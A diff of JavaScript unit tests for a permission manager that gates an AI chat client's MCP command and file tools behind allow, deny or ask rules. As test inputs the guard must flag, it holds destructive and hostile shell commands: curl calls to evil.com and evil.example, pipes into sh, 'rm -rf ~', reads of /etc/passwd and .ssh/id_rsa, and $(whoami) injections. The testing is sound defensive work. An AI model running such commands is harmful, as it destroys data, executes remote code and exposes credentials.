@@ -25,16 +25,16 @@ test('ChatToolSecurity - Herramientas MCP requieren confirmación por defecto', 
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_mcp_default' });
 
   const evalMcp = manager.evaluateAuthorization({
-    id: 'execute_command',
-    name: 'execute_command',
+    id: 'run_command',
+    name: 'run_command',
     category: 'mcp',
-    metadata: { mcpServerName: 'mcp-proxy', originalName: 'execute_command' }
+    metadata: { mcpServerName: 'mcp-proxy', originalName: 'run_command' }
   }, { command: 'ls -la' });
 
   assert.equal(evalMcp.requiresApproval, true);
   assert.equal(evalMcp.status, 'ask');
   assert.equal(evalMcp.serverName, 'mcp-proxy');
-  assert.equal(evalMcp.originalName, 'execute_command');
+  assert.equal(evalMcp.originalName, 'run_command');
 });
 
 test('ChatToolSecurity - Lista global R/W controla las herramientas integradas de archivos', () => {
@@ -73,9 +73,9 @@ test('ChatToolSecurity - La lista de directorios restringe herramientas de archi
   assert.equal(manager.evaluateAuthorization(tool, { path: './not-allowed.txt' }).status, 'allow');
 });
 
-test('ChatToolSecurity - execute_command y bash aplican constraints y bloquean encadenamiento no autorizado', () => {
+test('ChatToolSecurity - run_command aplica constraints y bloquea encadenamiento no autorizado', () => {
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_command_directory_rules' });
-  manager.setToolPolicy('execute_command', 'allow', {
+  manager.setToolPolicy('run_command', 'allow', {
     constraints: {
       command: {
         allowedPrefixes: ['du -sh ./workspace', 'rm ./workspace/'],
@@ -85,17 +85,12 @@ test('ChatToolSecurity - execute_command y bash aplican constraints y bloquean e
       }
     }
   });
-  const tool = { id: 'execute_command', name: 'execute_command', category: 'mcp', metadata: { originalName: 'execute_command' } };
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp', metadata: { originalName: 'bash' } };
+  const tool = { id: 'run_command', name: 'run_command', category: 'mcp', metadata: { originalName: 'run_command' } };
 
   assert.equal(manager.evaluateAuthorization(tool, { command: 'du -sh ./workspace' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'du -sh ./workspace' }).status, 'allow');
   assert.equal(manager.evaluateAuthorization(tool, { command: 'rm ./workspace/tmp.log' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'rm ./workspace/tmp.log' }).status, 'allow');
   assert.equal(manager.evaluateAuthorization(tool, { command: 'rm ../outside.log' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'rm ../outside.log' }).status, 'ask');
   assert.equal(manager.evaluateAuthorization(tool, { command: 'rm ./workspace/tmp.log; cat /etc/passwd' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'rm ./workspace/tmp.log; cat /etc/passwd' }).status, 'ask');
 });
 
 test('ChatToolSecurity - Modo global allow_all autoriza todas las herramientas MCP', () => {
@@ -121,7 +116,7 @@ test('ChatToolSecurity - Autorización granular de grano fino por herramienta', 
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_granular' });
 
   const toolA = { id: 'read_file', name: 'read_file', category: 'mcp' };
-  const toolB = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
+  const toolB = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   // 1. Ambas requieren confirmación inicialmente
   assert.equal(manager.evaluateAuthorization(toolA).requiresApproval, true);
@@ -142,7 +137,7 @@ test('ChatToolSecurity - Autorización granular de grano fino por herramienta', 
   assert.equal(evalB.status, 'ask');
 
   // 5. Establecer regla deny en toolB
-  manager.setToolPolicy(toolB.id, 'deny', { serverName: 'mcp-proxy', originalName: 'execute_command' });
+  manager.setToolPolicy(toolB.id, 'deny', { serverName: 'mcp-proxy', originalName: 'run_command' });
   const evalBDeny = manager.evaluateAuthorization(toolB);
   assert.equal(evalBDeny.requiresApproval, false);
   assert.equal(evalBDeny.status, 'deny');
@@ -290,17 +285,17 @@ test('ChatToolSecurity - Autorización contextual de comandos con pipes y permis
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_cmd_pipes' });
 
   const canonicalTool = {
-    id: 'execute_command',
-    name: 'execute_command',
+    id: 'run_command',
+    name: 'run_command',
     category: 'mcp',
     aliases: [],
-    metadata: { mcpServerName: 'mcp-proxy', originalName: 'execute_command' }
+    metadata: { mcpServerName: 'mcp-proxy', originalName: 'run_command' }
   };
 
   // Se autoriza permanentemente para siempre con prefijo 'du *' (tal como lo genera el botón de UI)
   manager.setToolPolicy(canonicalTool.id, 'allow', {
     serverName: 'mcp-proxy',
-    originalName: 'execute_command',
+    originalName: 'run_command',
     constraints: {
       command: {
         allowedPrefixes: ['du ', 'du'],
@@ -357,7 +352,7 @@ test('ChatToolSecurity - Autorización contextual de comandos con pipes y permis
 
   // 8. Solo el nombre canónico recupera la política.
   assert.equal(manager.getToolPolicy('other_command'), null);
-  assert.equal(manager.getToolPolicy('execute_command'), 'allow');
+  assert.equal(manager.getToolPolicy('run_command'), 'allow');
 });
 
 test('ChatToolSecurity - Permisos recordados en herramientas integradas de archivo sobreviven recarga', () => {
@@ -401,8 +396,8 @@ test('ChatToolSecurity - F1: Una regla de directorio no omite restricciones de p
   manager.setDirectoryRules(['R:/tmp/zc-audit/**', 'W:/tmp/zc-audit/**']);
 
   const cmdTool = {
-    id: 'execute_command',
-    name: 'execute_command',
+    id: 'run_command',
+    name: 'run_command',
     category: 'mcp'
   };
 
@@ -501,43 +496,25 @@ test('ChatToolSecurity - Sesión acotada por token y preservación de autorizaci
   }
 });
 
-test('ChatToolSecurity - Sincronización automática de comandos entre execute_command y bash', () => {
-  const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_sync_cmd' });
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
+test('ChatToolSecurity - check_command no pide confirmación salvo denegación expresa', () => {
+  const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_check_command' });
+  const checkTool = { id: 'check_command', name: 'check_command', category: 'mcp', metadata: { originalName: 'check_command' } };
+  const runTool = { id: 'run_command', name: 'run_command', category: 'mcp', metadata: { originalName: 'run_command' } };
 
-  // 1. Autorizar python3 en execute_command
-  manager.setToolPolicy('execute_command', 'allow', {
-    constraints: {
-      command: {
-        allowedPrefixes: ['python3'],
-        allowChaining: false,
-        allowPipes: true
-      }
-    }
-  });
+  const checked = manager.evaluateAuthorization(checkTool, { job_id: 3, stop: true });
+  assert.equal(checked.status, 'allow');
+  assert.equal(checked.reason, 'job_control_tool');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'ls' }).status, 'ask');
 
-  // Ambos deben quedar autorizados con el mismo prefijo
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'python3 script.py' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'python3 script.py' }).status, 'allow');
-
-  // Comandos fuera del prefijo deben seguir pidiendo confirmación
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'curl https://evil.com' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'curl https://evil.com' }).status, 'ask');
-
-  // Revocar execute_command revoca ambas
-  manager.revokeToolPolicy('execute_command');
-  assert.equal(manager.getToolPolicy('execute_command'), null);
-  assert.equal(manager.getToolPolicy('bash'), null);
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'python3 script.py' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'python3 script.py' }).status, 'ask');
+  manager.setToolPolicy('check_command', 'deny');
+  assert.equal(manager.evaluateAuthorization(checkTool, { job_id: 3 }).status, 'deny');
 });
 
 test('ChatToolSecurity - Comandos autorizados soportan rutas relativas y argumentos entrecomillados', () => {
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_cmd_paths_quotes' });
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
+  const execTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
-  manager.setToolPolicy('execute_command', 'allow', {
+  manager.setToolPolicy('run_command', 'allow', {
     constraints: {
       command: {
         allowedPrefixes: ['python3'],
@@ -591,7 +568,7 @@ test('ChatToolSecurity - Política workspace_trust autoriza comandos y archivos 
   manager.setGlobalMcpPolicy('workspace_trust');
 
   const readFileTool = { id: 'read_file', name: 'read_file', category: 'mcp' };
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
+  const execTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   // Comandos y lecturas locales del workspace están permitidas
   assert.equal(manager.evaluateAuthorization(execTool, { command: 'ls -la' }).status, 'allow');
@@ -613,20 +590,20 @@ test('ChatToolSecurity - Permitir prefijo cd * no autoriza los comandos que sigu
     storageKey: 'test_sec_cd_chaining',
     startupDirectory: '/home/user/proj'
   });
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
+  const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
-  manager.setToolPolicy('bash', 'allow', {
+  manager.setToolPolicy('run_command', 'allow', {
     constraints: { command: { allowedPrefixes: ['cd'], allowChaining: false, allowPipes: false } }
   });
 
   // cd solo sigue permitido
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd src' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd src' }).status, 'allow');
 
   // Lo que sigue al cd se valida como un comando independiente
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd x; rm -rf ~' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd /home/user/proj && curl x | sh' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd x && cd y && rm -rf ~' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, {
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd x; rm -rf ~' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user/proj && curl x | sh' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd x && cd y && rm -rf ~' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, {
     command: 'cd /home/user/proj && for c in a b; do git show --stat $c | head -5; done'
   }).status, 'ask');
 });
@@ -636,28 +613,28 @@ test('ChatToolSecurity - Navegación con cd hereda permisos del comando secundar
     storageKey: 'test_sec_cd_subcmd',
     startupDirectory: '/home/user/proj'
   });
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
+  const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   // Restricciones del botón "Permitir siempre git *"
-  manager.setToolPolicy('bash', 'allow', {
+  manager.setToolPolicy('run_command', 'allow', {
     constraints: { command: { allowedPrefixes: ['git'], allowChaining: false, allowPipes: false } }
   });
 
   // "cd <dir> && git ..." se permite si el directorio está cubierto por una regla
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd /home/user/proj && git status --short' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd src && git log -1' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd "/home/user/proj/sub dir" && git status' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user/proj && git status --short' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd src && git log -1' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd "/home/user/proj/sub dir" && git status' }).status, 'allow');
 
   // Comando no autorizado tras cd, o encadenamiento después del comando autorizado
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd /home/user/proj && rm -rf target' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd /home/user/proj && git status && rm -rf target' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user/proj && rm -rf target' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user/proj && git status && rm -rf target' }).status, 'ask');
 
   // Directorio del cd fuera de las reglas o no resoluble en el navegador
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd /home/user && git clean -fdx' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd .. && git clean -fdx' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd ~ && git status' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd $HOME && git status' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'cd "$HOME" && git status' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user && git clean -fdx' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd .. && git clean -fdx' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd ~ && git status' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd $HOME && git status' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd "$HOME" && git status' }).status, 'ask');
 
   // La tarjeta ofrece autorizar el programa que sigue al cd
   assert.equal(ChatToolSecurity.getCommandBaseName('cd /home/user/proj && git status'), 'git');
@@ -678,7 +655,7 @@ test('ChatToolSecurity - Inyección por defecto de R:<startup_directory> y restr
   const readTool = { id: 'read_file', name: 'read_file', category: 'mcp' };
   const writeTool = { id: 'write_file', name: 'write_file', category: 'mcp' };
   const editTool = { id: 'edit_file', name: 'edit_file', category: 'mcp' };
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
+  const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   // 2. Lectura dentro del directorio de arranque: permitida directamente
   const evalReadInternal = manager.evaluateAuthorization(readTool, { path: `${customStartupDir}/src/app.py` });
@@ -705,7 +682,7 @@ test('ChatToolSecurity - Inyección por defecto de R:<startup_directory> y restr
   assert.equal(evalReadExternal.requiresApproval, true);
 
   // 6. Ejecución de comandos en modo ask: requiere autorización
-  const evalBash = manager.evaluateAuthorization(bashTool, { command: 'ls -la' });
+  const evalBash = manager.evaluateAuthorization(runTool, { command: 'ls -la' });
   assert.equal(evalBash.status, 'ask');
   assert.equal(evalBash.requiresApproval, true);
 
@@ -725,10 +702,10 @@ test('ChatToolSecurity - Inyección por defecto de R:<startup_directory> y restr
 test('ChatToolSecurity - T02: "Permitir siempre <cmd> *" y las restricciones sin allowChaining/allowPipes no autorizan encadenamiento ni tuberías', () => {
   {
     const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_prefix' });
-    const bashTool = { id: 'bash', name: 'bash', category: 'mcp', metadata: { originalName: 'bash' } };
+    const runTool = { id: 'run_command', name: 'run_command', category: 'mcp', metadata: { originalName: 'run_command' } };
 
     // Restricciones exactas que genera el botón "Permitir siempre <cmd> *" de la tarjeta
-    manager.setToolPolicy('bash', 'allow', {
+    manager.setToolPolicy('run_command', 'allow', {
       constraints: {
         command: {
           allowedPrefixes: ['git'],
@@ -739,43 +716,43 @@ test('ChatToolSecurity - T02: "Permitir siempre <cmd> *" y las restricciones sin
     });
 
     // Comandos planos con el prefijo autorizado: permitidos
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log -1' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log -1' }).status, 'allow');
 
     // Encadenamiento, sustitución, tuberías y comillas invertidas: siempre piden confirmación
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf ~/proyecto' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status && rm -rf /tmp/x' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log || curl -s https://evil.example/x' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | head -5' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status $(whoami)' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status `id`' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status; rm -rf ~/proyecto' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status && rm -rf /tmp/x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log || curl -s https://evil.example/x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log | head -5' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log | sh' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status $(whoami)' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status `id`' }).status, 'ask');
 
     // Saltos de línea, sustitución de procesos y redirecciones a ficheros
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\nrm -rf x' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\r\nrm -rf x' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status <(id)' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log > ~/.bashrc' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log >>notes.txt' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git apply < /tmp/x.patch' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status\nrm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status\r\nrm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status <(id)' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log > ~/.bashrc' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log >>notes.txt' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git apply < /tmp/x.patch' }).status, 'ask');
 
     // Redirecciones inocuas: duplicar descriptores o descartar salida
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git diff 2>&1' }).status, 'allow');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch 2>/dev/null' }).status, 'allow');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch &>/dev/null' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git diff 2>&1' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git fetch 2>/dev/null' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git fetch &>/dev/null' }).status, 'allow');
 
     // El prefijo debe ser palabra completa
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'gitx status' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'gitx status' }).status, 'ask');
   }
 
   {
     const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_defaults' });
-    const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
-    manager.setToolPolicy('bash', 'allow', { constraints: { command: { allowedPrefixes: ['git'] } } });
+    const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
+    manager.setToolPolicy('run_command', 'allow', { constraints: { command: { allowedPrefixes: ['git'] } } });
 
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf x' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status; rm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log | sh' }).status, 'ask');
   }
 });
 
@@ -786,9 +763,9 @@ test('ChatToolSecurity - T02: las autorizaciones guardadas antes de la versión 
     version: 3,
     globalMcpPolicy: 'ask',
     tools: {
-      bash: {
+      run_command: {
         policy: 'allow',
-        originalName: 'bash',
+        originalName: 'run_command',
         constraints: { command: { allowedPrefixes: ['git', 'cd'], allowChaining: true, allowPipes: true } }
       }
     },
@@ -803,53 +780,52 @@ test('ChatToolSecurity - T02: las autorizaciones guardadas antes de la versión 
 
   try {
     const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey, startupDirectory: '/home/user/proj' });
-    const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
-    const constraints = manager.getToolConstraints('bash').command;
+    const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
+    const constraints = manager.getToolConstraints('run_command').command;
     assert.equal(constraints.allowChaining, false);
     assert.equal(constraints.allowPipes, false);
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf ~' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
-    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status; rm -rf ~' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git log | sh' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status' }).status, 'allow');
 
     // Una vez guardadas en la versión actual, las opciones explícitas se respetan al recargar
-    manager.setToolPolicy('bash', 'allow', {
+    manager.setToolPolicy('run_command', 'allow', {
       constraints: { command: { allowedPrefixes: ['git'], allowChaining: false, allowPipes: true } }
     });
     assert.equal(JSON.parse(store.get(storageKey)).version, 4);
     const reloaded = new ChatToolSecurity.ToolSecurityManager({ storageKey, startupDirectory: '/home/user/proj' });
-    assert.equal(reloaded.getToolConstraints('bash').command.allowPipes, true);
+    assert.equal(reloaded.getToolConstraints('run_command').command.allowPipes, true);
   } finally {
     if (previousLocalStorage === undefined) delete global.localStorage;
     else global.localStorage = previousLocalStorage;
   }
 });
 
-test('ChatToolSecurity - T01/T02: el cwd de un comando autorizado debe estar cubierto por una regla de directorio', () => {
+test('ChatToolSecurity - T01/T02: el cd inicial de un comando autorizado debe estar cubierto por una regla de directorio', () => {
   const manager = new ChatToolSecurity.ToolSecurityManager({
     storageKey: 'test_sec_t02_cwd',
     startupDirectory: '/home/user/proj'
   });
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
-  manager.setToolPolicy('execute_command', 'allow', {
+  const runTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
+  manager.setToolPolicy('run_command', 'allow', {
     constraints: { command: { allowedPrefixes: ['git'], allowChaining: false, allowPipes: false } }
   });
 
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'git status', cwd: '.' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'git status', cwd: '/home/user/proj/sub' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'git status', cwd: 'sub' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'git status' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd /home/user/proj/sub && git status' }).status, 'allow');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd sub && git status' }).status, 'allow');
 
-  const outside = manager.evaluateAuthorization(execTool, { command: 'git clean -fdx', cwd: '/home/user' });
+  const outside = manager.evaluateAuthorization(runTool, { command: 'cd /home/user && git clean -fdx' });
   assert.equal(outside.status, 'ask');
   assert.equal(outside.reason, 'command_directory_outside_rules');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'git clean -fdx', cwd: '~' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'git clean -fdx', cwd: '..' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'cd .. && git status', cwd: '/home/user/proj' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd ~ && git clean -fdx' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(runTool, { command: 'cd .. && git status' }).status, 'ask');
 });
 
 test('ChatToolSecurity - T02: workspace_trust pide confirmación para ~, $HOME, rutas de usuario y tuberías a shell', () => {
   const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_workspace_trust' });
   manager.setGlobalMcpPolicy('workspace_trust');
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
+  const execTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   // Comandos locales sin efectos externos siguen permitidos
   assert.equal(manager.evaluateAuthorization(execTool, { command: 'ls -la' }).status, 'allow');
@@ -880,9 +856,9 @@ test('ChatToolSecurity - T02: workspace_trust pide confirmación para ~, $HOME, 
     assert.equal(manager.evaluateAuthorization(execTool, { command }).status, 'ask', command);
   }
 
-  // cwd y "cd <dir> &&" deben estar cubiertos por las reglas de directorio
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'cat .ssh/id_rsa', cwd: '~' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'ls', cwd: '/' }).status, 'ask');
+  // "cd <dir> &&" debe estar cubierto por las reglas de directorio
+  assert.equal(manager.evaluateAuthorization(execTool, { command: 'cd ~ && cat .ssh/id_rsa' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(execTool, { command: 'cd / && ls' }).status, 'ask');
 });
 
 test('ChatToolSecurity - T02: workspace_trust confía en comandos simples dentro de las reglas de directorio', () => {
@@ -891,7 +867,7 @@ test('ChatToolSecurity - T02: workspace_trust confía en comandos simples dentro
     startupDirectory: '/home/user/proj'
   });
   manager.setGlobalMcpPolicy('workspace_trust');
-  const execTool = { id: 'execute_command', name: 'execute_command', category: 'mcp' };
+  const execTool = { id: 'run_command', name: 'run_command', category: 'mcp' };
 
   for (const command of [
     'npm test', 'git log --oneline | head -20', 'grep -rn TODO src | wc -l', 'ls -la ./src',
@@ -899,8 +875,7 @@ test('ChatToolSecurity - T02: workspace_trust confía en comandos simples dentro
   ]) {
     assert.equal(manager.evaluateAuthorization(execTool, { command }).status, 'allow', command);
   }
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'npm test', cwd: '/home/user/proj' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(execTool, { command: 'npm test', cwd: '/home/user' }).status, 'ask');
+  assert.equal(manager.evaluateAuthorization(execTool, { command: 'cd /home/user && npm test' }).status, 'ask');
 });
 
 test('ChatToolSecurity - T01: rutas con ~, ~usuario o variables piden confirmación (no se resuelven en el navegador)', () => {
